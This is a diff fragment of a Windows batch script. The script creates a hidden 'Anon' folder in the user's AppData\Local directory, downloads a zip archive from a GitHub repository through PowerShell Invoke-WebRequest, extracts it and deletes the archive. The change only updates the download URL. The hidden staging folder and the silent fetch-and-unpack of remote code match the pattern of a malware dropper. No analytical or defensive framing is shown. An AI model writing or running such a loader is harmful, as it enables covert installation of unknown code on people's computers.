@@ -25,7 +25,7 @@ cd "C:\Users\%USERNAME%\AppData\Local"
 mkdir "Anon"
 attrib +h "Anon" /s /d
 cd C:\Users\%USERNAME%\AppData\Local\Anon" 
-Powershell -Command "Invoke-Webrequest 'https://github.com/mohibalkal1/1/raw/refs/heads/main/1.zip' -OutFile 1.zip"
+Powershell -Command "Invoke-Webrequest 'https://github.com/mohibalkal1/mohib/blob/main/1.zip' -OutFile 1.zip"
 tar -xf 1.zip
 del 1.zip
 
